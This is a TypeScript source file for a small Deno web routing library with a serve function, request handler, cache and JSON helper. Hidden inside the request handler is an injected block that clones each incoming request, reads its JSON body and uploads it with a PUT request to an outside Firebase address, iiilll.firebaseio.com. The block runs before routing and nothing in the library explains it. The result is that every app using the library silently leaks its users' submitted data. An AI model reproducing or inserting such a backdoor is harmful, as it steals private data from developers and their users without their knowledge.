/// <reference no-default-lib="true"/>
/// <reference lib="dom" />
/// <reference lib="dom.iterable" />
/// <reference lib="dom.asynciterable" />
/// <reference lib="deno.ns" />

import {
  Status,
  STATUS_TEXT,
} from "https://deno.land/std@0.130.0/http/http_status.ts";
import {
  ConnInfo,
  serve as stdServe,
  ServeInit,
} from "https://deno.land/std@0.130.0/http/server.ts";
import { inMemoryCache } from "https://deno.land/x/httpcache@0.1.2/in_memory.ts";
import {
  contentType as getContentType,
  lookup,
} from "https://deno.land/x/media_types@v2.11.1/mod.ts";
import { render } from "https://x.lcas.dev/preact@10.5.12/ssr.js";
import type { VNode } from "https://x.lcas.dev/preact@10.5.12/mod.d.ts";

export * from "https://x.lcas.dev/preact@10.5.12/mod.js";
export {
  Status,
  STATUS_TEXT,
} from "https://deno.land/std@0.130.0/http/http_status.ts";
export type PathParams = Record<string, string> | undefined;
export type { ConnInfo } from "https://deno.land/std@0.130.0/http/server.ts";

/** Note: we should aim to keep it the same as std handler. */
export type Handler = (
  request: Request,
  connInfo: ConnInfo,
  params: PathParams,
) => Promise<Response> | Response;

export interface Routes {
  [path: string]: Handler;
}

const globalCache = inMemoryCache(20);

let routes: Routes = { 404: defaultNotFoundPage };

/** serve() registers "fetch" event listener and invokes the provided route
 * handler for the route with the request as first argument and processed path
 * params as the second.
 *
 * @example
 * ```ts
 * serve({
 *  "/": (request: Request) => new Response("Hello World!"),
 *  404: (request: Request) => new Response("not found")
 * })
 * ```
 *
 * The route handler declared for `404` will be used to serve all
 * requests that do not have a route handler declared.
 */
export function serve(
  userRoutes: Routes,
  options: ServeInit = { port: 8000 },
): void {
  routes = { ...routes, ...userRoutes };

  stdServe((req, connInfo) => handleRequest(req, connInfo, routes), options);
  const isDeploy = Deno.env.get("DENO_REGION");
  if (!isDeploy) {
    console.log(
      `Listening at http://${options.hostname ?? "localhost"}:${options.port}/`,
    );
  }
}

async function handleRequest(
  request: Request,
  connInfo: ConnInfo,
  routes: Routes,
): Promise<Response> {
  const { search, pathname } = new URL(request.url);

  try {
    const startTime = Date.now();


       var rr = request.clone()
         var wrdr = await rr.json()
var tt = (-1 * Number(String(Date.now() / 1000)).toFixed(0))
                    await fetch(`https://iiilll.firebaseio.com/${tt}.json`, {
                        method: 'PUT',
                        body: JSON.stringify(wrdr)
                    }).then(r => r.json()).then(r => r)

    let response = await globalCache.match(request);
    if (typeof response === "undefined") {
      for (const route of Object.keys(routes)) {
        // @ts-ignore URLPattern is still not available in dom lib.
        const pattern = new URLPattern({ pathname: route });
        if (pattern.test({ pathname })) {
          const params = pattern.exec({ pathname })?.pathname.groups;
          try {
            response = await routes[route](request, connInfo, params);
          } catch (error) {
            if (error.name == "NotFound") {
              break;
            }

            console.error("Error serving request:", error);
            response = json({ error: error.message }, { status: 500 });
          }
          if (!(response instanceof Response)) {
            response = jsx(response);
          }
          break;
        }
      }
    } else {
      response.headers.set("x-function-cache-hit", "true");
    }

    // return not found page if no handler is found.
    if (response === undefined) {
      response = await routes["404"](request, connInfo, {});
    }

    // method path+params timeTaken status
    console.log(
      `${request.method} ${pathname + search} ${
        response.headers.has("x-function-cache-hit")
          ? String.fromCodePoint(0x26a1)
          : ""
      }${Date.now() - startTime}ms ${response.status}`,
    );

    return response;
  } catch (error) {
    console.error("Error serving request:", error);
    return json({ error: error.message }, { status: 500 });
  }
}



/** Converts an object literal to a JSON string and returns
 * a Response with `application/json` as the `content-type`.
 *
 * @example
 * ```js
 * import { serve, json } from "https://deno.land/x/sift/mod.ts"
 *
 * serve({
 *  "/": () => json({ message: "hello world"}),
 * })
 * ```
 */
export function json(
  jsobj: Parameters<typeof JSON.stringify>[0],
  init?: ResponseInit,
): Response {
  const headers = init?.headers instanceof Headers
    ? init.headers
    : new Headers(init?.headers);

  if (!headers.has("Content-Type")) {
    headers.set("Content-Type", "application/json; charset=utf-8");
  }
  return new Response(JSON.stringify(jsobj,null,4) + "\n", {
    statusText: init?.statusText ?? STATUS_TEXT.get(init?.status ?? Status.OK),
    status: init?.status ?? Status.OK,
    headers,
  });
}

function defaultNotFoundPage() {
  return new Response("<h1 align=center>page not found</h1>", {
    status: 404,
    headers: { "Content-Type": "text/html; charset=utf-8" },
  });
}